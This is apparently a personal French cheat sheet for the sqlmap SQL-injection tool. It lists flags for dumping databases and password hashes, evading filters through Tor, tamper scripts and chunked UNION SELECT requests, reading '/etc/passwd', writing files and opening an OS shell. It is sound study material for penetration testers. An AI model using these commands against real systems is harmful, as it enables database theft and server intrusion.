Pour extraire requête d'un site web: 
1. F12 > Réseau > clique droit sur requête > Copie cURL
2. remplacer curl par sqlmap
3. -p pour marquer un param ou * après un param ex: “id=1*”
4. Copier l'en-tête dans un fichier et -r entete.txt pour l'exécuter

* --host, --referer, and -A/--user-agent --random-agent 
* --mobile (en-tête mobile)
* --method PUT

Utiliser * dans l'entete pour la tester

# Enumération
| commande |
| --- |
|--banner|
|--hostname|
|--current-db|
|--current-user|
|--passwords|

# Extraction
| commande | description |
| --- | --- |
| --tables ||
|--dump<br>	-T [table]<br> -D [BD]<br> -C [colonne]<br>	```--where="name LIKE 'kimberly%'"``` ||
| --dump-all --exclude -sysdbs ||
| --schema ||
| --search -T user 		|Cherche tables contenant le mot user|
| --passwords			|mot de passes dans BD systèmes |

# Tuning
| commande | description |
| --- | --- |
| ```--prefix="%'))" --suffix="-- -"``` | |
| ```--level [1-5]``` |	étend les vecteurs et frontières|
| ```--risk [1-3]``` |étend les vecteurs. Peut avoir à augmenter le risk dans le cas de OR, page d'authentification. Requête vulnérable modifie peut-être la BD?|
| ```--code=200``` |	code pour détecter VRAI|
| ```--title``` |			utilise la balise HTML \<title> pour différencier|
| ```--string=success``` |	chaîne se retrouvant dans la réponse VRAI|
| ```--text-only``` |	regarde seulement le texte visible|
| ```--technique=BEU``` |	limite les techniques|
| ```--union-from=users``` |	appendice pour union|
| ```--union-cols=5``` ||

# Debug
| commande | description |
| --- | --- |
| ```--parse-errors``` | 	pour afficher les erreurs |
| ```-t fichier.txt``` | 		sauvegarder le traffic |
| ```-v [1-6]``` |			verbosité (3 voit payload) |
| ```--proxy``` |			Peut renvoyer le traffic vers burp pour analyse |

# Passer protections
| commande | description |
| --- | --- |
| ```--csrf-token=<nom_jeton>``` ||
| ```--randomize=<nom_param>``` | |
| ```--eval="import hashlib; h=hashlib.md5(id).hexdigest()"``` | Quand calcul côté client attendu ex: h=MD5(id)	|
| ```--proxy="socks4://177.39.187.70:33283"``` ||
| ```--proxy-file``` | |
| ```--tor	``` |		ressort par un noeud TOR doit avoir un proxy SOCKS4 sur 9050 our 9150|
| ```--check-tor``` |	vérifie connexion TOR en se connectant sur https://check.torproject.org/|
| ```--random-agent``` ||
| ```--tamper=script,script,...``` ||
| ```--list-tampers``` ||
| ```--chunked	``` |	passe les requêtes proscrites en plusieurs paquets. Peut aussi séparer les requêtes sur plusieurs params reconstruits par la cible si supporté ```?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...```)
	
# Exécution
| commande | description |
| --- | --- |
| ```--file-read "/etc/passwd"``` ||
| ```--file-write <fichier> --file-dest <destination>``` ||
| ```--os-shell	``` |	Exécute du code. La version 64bit ou 32bit est importante!|
